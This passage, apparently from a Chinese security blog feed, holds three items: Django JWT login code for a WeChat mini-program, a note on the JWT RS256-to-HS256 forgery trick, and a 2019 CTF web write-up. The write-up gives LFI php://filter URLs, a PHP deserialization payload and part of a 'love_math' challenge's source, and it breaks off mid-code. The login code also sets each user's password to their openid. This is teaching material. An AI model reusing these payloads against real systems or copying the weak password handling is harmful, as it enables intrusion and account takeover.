class="string">&#x27;rest_framework_jwt.authentication.JSONWebTokenAuthentication&#x27;</span>,<span class="comment"># JWT认证，在前面的认证方案优先</span></span><br><span class="line">        <span class="string">&#x27;rest_framework.authentication.SessionAuthentication&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;rest_framework.authentication.BasicAuthentication&#x27;</span>,</span><br><span class="line">    ),</span><br><span class="line">&#125;</span><br><span class="line">JWT_AUTH = &#123;</span><br><span class="line">    <span class="string">&#x27;JWT_EXPIRATION_DELTA&#x27;</span>: datetime.timedelta(days=<span class="number">1</span>), <span class="comment">#JWT_EXPIRATION_DELTA 指明token的有效期</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>登录函数的实现：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">登录函数：</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_user_info_func</span>(<span class="params">user_code</span>):</span></span><br><span class="line">    api_url = <span class="string">&#x27;https://api.weixin.qq.com/sns/jscode2session?appid=&#123;0&#125;&amp;secret=&#123;1&#125;&amp;js_code=&#123;2&#125;&amp;grant_type=authorization_code&#x27;</span></span><br><span class="line">    get_url = api_url.<span class="built_in">format</span>(App_id,App_secret,user_code)</span><br><span class="line">    r = requests.get(get_url)</span><br><span class="line">    <span class="keyword">return</span> r.json()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@require_http_methods(<span class="params">[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">user_login_func</span>(<span class="params">request</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        user_code = request.POST.get(<span class="string">&#x27;user_code&#x27;</span>)</span><br><span class="line">        print(user_code)</span><br><span class="line">        <span class="keyword">if</span> user_code == <span class="literal">None</span>:</span><br><span class="line">            print(request.body)</span><br><span class="line">            json_data =  json.loads(request.body)</span><br><span class="line">            user_code = json_data[<span class="string">&#x27;user_code&#x27;</span>]</span><br><span class="line">            print(user_code)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&#x27;status&#x27;</span>:<span class="number">500</span>,<span class="string">&#x27;error&#x27;</span>:<span class="string">&#x27;请输入完整数据&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        json_data = get_user_info_func(user_code)</span><br><span class="line">        <span class="comment">#json_data = &#123;&#x27;errcode&#x27;:0,&#x27;openid&#x27;:&#x27;111&#x27;,&#x27;session_key&#x27;:&#x27;test&#x27;&#125;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;errcode&#x27;</span> <span class="keyword">in</span> json_data:</span><br><span class="line">            <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&#x27;status&#x27;</span>: <span class="number">500</span>, <span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;验证错误：&#x27;</span> + json_data[<span class="string">&#x27;errmsg&#x27;</span>]&#125;)</span><br><span class="line">        res = login_or_create_account(json_data)</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(res)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&#x27;status&#x27;</span>:<span class="number">500</span>,<span class="string">&#x27;error&#x27;</span>:<span class="string">&#x27;无法与微信验证端连接&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login_or_create_account</span>(<span class="params">json_data</span>):</span></span><br><span class="line">    openid = json_data[<span class="string">&#x27;openid&#x27;</span>]</span><br><span class="line">    session_key = json_data[<span class="string">&#x27;session_key&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        user = User.objects.get(username=openid)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        user = User.objects.create(</span><br><span class="line">            username=openid,</span><br><span class="line">            password=openid,</span><br><span class="line">        )</span><br><span class="line">    user.session_key = session_key</span><br><span class="line">    user.save()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        jwt_payload_handler = api_settings.JWT_PAYLOAD_HANDLER</span><br><span class="line">        jwt_encode_handler = api_settings.JWT_ENCODE_HANDLER</span><br><span class="line">        payload = jwt_payload_handler(user)</span><br><span class="line">        token = jwt_encode_handler(payload)</span><br><span class="line">        res = &#123;</span><br><span class="line">            <span class="string">&#x27;status&#x27;</span>: <span class="number">200</span>,</span><br><span class="line">            <span class="string">&#x27;token&#x27;</span>: token</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        res = &#123;</span><br><span class="line">            <span class="string">&#x27;status&#x27;</span>: <span class="number">500</span>,</span><br><span class="line">            <span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;jwt验证失败&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><br>视图函数：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">视图样例：</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> JsonResponse</span><br><span class="line"><span class="keyword">from</span> account.models <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> rest_framework_jwt.views <span class="keyword">import</span> APIView</span><br><span class="line"><span class="keyword">from</span> rest_framework <span class="keyword">import</span> authentication</span><br><span class="line"><span class="keyword">from</span> rest_framework.permissions <span class="keyword">import</span> IsAuthenticated</span><br><span class="line"><span class="keyword">from</span> rest_framework_jwt.authentication <span class="keyword">import</span> JSONWebTokenAuthentication</span><br><span class="line"><span class="keyword">from</span> rest_framework <span class="keyword">import</span> permissions</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IsOwnerOrReadOnly</span>(<span class="params">permissions.BasePermission</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">has_object_permission</span>(<span class="params">self, request, view, obj</span>):</span></span><br><span class="line">        <span class="keyword">if</span> request.method <span class="keyword">in</span> [<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> obj.user == request.user</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test_view</span>(<span class="params">APIView</span>):</span></span><br><span class="line">    http_method_names = [<span class="string">&#x27;post&#x27;</span>]  <span class="comment">#限制api的访问方式</span></span><br><span class="line">    authentication_classes = (authentication.SessionAuthentication,JSONWebTokenAuthentication)</span><br><span class="line">    permission_classes = (IsAuthenticated,IsOwnerOrReadOnly)       <span class="comment">#权限管理</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span>(<span class="params">self,request</span>):</span>                                        <span class="comment">#视图函数</span></span><br><span class="line">        user = request.user.username</span><br><span class="line">        U = User.objects.get(username=user)</span><br><span class="line">        json_data = json.loads(request.body)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            test = json_data[<span class="string">&#x27;&#x27;</span>]</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&#x27;status&#x27;</span>:<span class="number">500</span>,<span class="string">&#x27;errmsg&#x27;</span>:<span class="string">&#x27;参数不全&#x27;</span>&#125;)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            U.sex = sex</span><br><span class="line">            U.weight = weight</span><br><span class="line">            U.height = height</span><br><span class="line">            U.save()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&#x27;status&#x27;</span>: <span class="number">500</span>, <span class="string">&#x27;errmsg&#x27;</span>: <span class="string">&#x27;数据库错误&#x27;</span>&#125;)</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&#x27;status&#x27;</span>:<span class="number">200</span>&#125;)</span><br></pre></td></tr></table></figure><br>urls.py:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">    re_path(<span class="string">&#x27;^$&#x27;</span>, index),</span><br><span class="line">    re_path(<span class="string">&#x27;^login$&#x27;</span>,login),                                 <span class="comment"># 登录</span></span><br><span class="line">    re_path(<span class="string">&#x27;^test$&#x27;</span>,test_view.as_view())</span><br><span class="line">]</span><br></pre></td></tr></table></figure></p><h1 id="从一道CTF引发的对JWT安全的简单思考"><a href="#从一道CTF引发的对JWT安全的简单思考" class="headerlink" title="从一道CTF引发的对JWT安全的简单思考"></a>从一道CTF引发的对JWT安全的简单思考</h1><h2 id="引例"><a href="#引例" class="headerlink" title="引例"></a>引例</h2><p>题目：2019ISCC Web6</p><p>解题关键：</p><p>改题的加密方式为：RS256，是一种非对称加密，分有公钥和私钥。</p><p>其中：</p><ul><li>私钥加密</li><li>公钥解密</li></ul><p>当公钥泄露时，将JWT中的Header部分算法改为对称加密，攻击者本地使用泄露的公司进行Token伪造，将获取到的Token发送给验证端时，会使用公钥按照Header中的算法进行解密，而在原来的Header中算法为RS256，需要私钥加密生成Token，可是当我们修改为对称加密的HS256时，我们便可以成功伪造Token，且服务端也可以正常验证。</p><p>产生这一问题的主要原因便是，HWT的Header段是可控制的，通常只经过一层base64编码处理，也就是说解密算法可有用户控制。</p><p>防御：保护公钥不泄露，将Header段经RSA等方法加密。</p><h2 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h2><ul><li>密钥可控</li><li>密钥爆破</li></ul><p>特殊情况，不做深入，感兴趣的可见<a href="https://www.anquanke.com/post/id/145540#h3-9">https://www.anquanke.com/post/id/145540#h3-9</a></p>]]></content>
      
      
      <categories>
          
          <category> 原创栏目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Django </tag>
            
            <tag> JWT </tag>
            
            <tag> 微信小程序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019全国大学生信息安全大赛两道web</title>
      <link href="2019/2019%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E5%AE%89%E8%B5%9B%E4%B8%A4%E9%A2%98WEB%E9%A2%98%E8%A7%A3/"/>
      <url>2019/2019%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E5%AE%89%E8%B5%9B%E4%B8%A4%E9%A2%98WEB%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h2 id="简单小结"><a href="#简单小结" class="headerlink" title="简单小结"></a>简单小结</h2><p>菜鸟第一次打国赛，这次题目质量很高，学到了许多姿势。</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Justsoso"><a href="#Justsoso" class="headerlink" title="Justsoso"></a>Justsoso</h3><p>打开题目，源代码出存在提示：<br><img src="https://0d077ef9e74d8.cdn.sohucs.com/romWP63_png" alt=""><br>使用LFI读取index.php与hint.php  </p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;d4dc224926cd47bca560b0ec2f84bad155efe5b747574b89.changame.ichunqiu.com&#x2F;?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;d4dc224926cd47bca560b0ec2f84bad155efe5b747574b89.changame.ichunqiu.com&#x2F;?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;hint.php</span><br></pre></td></tr></table></figure><p>得如下源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]; </span><br><span class="line"><span class="variable">$payload</span> = <span class="variable">$_GET</span>[<span class="string">&quot;payload&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Missing parameter&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;hack attacked!!!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$payload</span>))&#123;  </span><br><span class="line">    <span class="variable">$url</span> = parse_url(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]);</span><br><span class="line">    parse_str(<span class="variable">$url</span>[<span class="string">&#x27;query&#x27;</span>],<span class="variable">$query</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$query</span> <span class="keyword">as</span> <span class="variable">$value</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$value</span>)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$payload</span> = unserialize(<span class="variable">$payload</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;Missing parameters&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!--Please test index.php?file=xxx.php --&gt;</span><br><span class="line">&lt;!--Please get the source of hint.php--&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$handle</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">foreach</span>(get_object_vars(<span class="keyword">$this</span>) <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;<span class="variable">$k</span> = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Waking up\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$handle</span></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle = <span class="variable">$handle</span>; </span><br><span class="line">    &#125; </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;handle-&gt;getFlag();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token_flag</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;token_flag = <span class="keyword">$this</span>-&gt;token = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;token_flag = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token === <span class="keyword">$this</span>-&gt;token_flag)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line"><span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file,<span class="literal">true</span>); </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>很容易可以知道此题考的是php反序列化，通过file引入<code>hint.php</code>到<code>index.php</code>，操作payload反序列化执行类中的<code>getflag()</code>函数<br>此题有两个难点：<br>正则Flag判断绕过与随机数md5判断的绕过<br>前者可通过使用 <code>///</code>绕过<code>parse_url()</code>函数，此时该函数获取到的内容为空，而后者可以使用指针来将<code>token_flag</code>指向<code>token</code>，来使两者恒等。</p><p>添加以下代码在本地生成序列化字符串：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$a &#x3D; new Flag(‘flag.php’);</span><br><span class="line">$a-&gt;token_flag &#x3D; &amp;$a-&gt;token;</span><br><span class="line">$b &#x3D; new Handle($a);</span><br><span class="line">echo urlencode(serialize($b));</span><br></pre></td></tr></table></figure><br>输出的结果为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A6%3A%22Handle%22%3A1%3A%7Bs%3A14%3A%22%00Handle%00handle%22%3BO%3A4%3A%22Flag%22%3A3%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A5%3A%22token%22%3Bs%3A32%3A%22bc573864331a9e42e4511de6f678aa83%22%3Bs%3A10%3A%22token_flag%22%3BR%3A4%3B%7D%7D</span><br></pre></td></tr></table></figure></p><p>注意里边有不可见字符<code>%00</code>，且需要将<code>Handle</code>的对象数量改成2+，这样才可以进入<code>__destruct</code>函数。<br>故最终payload为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;&#x2F;index.php?file&#x3D;hint.php&amp;payload&#x3D;O:6:&quot;Handle&quot;:2:&#123;s:14:&quot;%00Handle%00handle&quot;;O:4:&quot;Flag&quot;:3:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;s:5:&quot;token&quot;;s:32:&quot;bc573864331a9e42e4511de6f678aa83&quot;;s:10:&quot;token_flag&quot;;R:4;&#125;&#125;</span><br></pre></td></tr></table></figure><br><img src="https://0d077ef9e74d8.cdn.sohucs.com/romXAJs_png" alt="">  </p><h3 id="love-math"><a href="#love-math" class="headerlink" title="love_math"></a>love_math</h3><p>打开题目，发现在js地址出使用ajax向calc.php发送数据<br>使用浏览器访问之，得源码<br><img src="https://0d077ef9e74d8.cdn.sohucs.com/ron0lAK_png" alt=""><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag </span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123; </span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="comment">//例子 c=20-1 </span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]; </span><br><span class="line">    <span class="keyword">if</span> (strlen(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>]; </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123; </span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp </span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    preg_match_all(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>); </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123; </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span 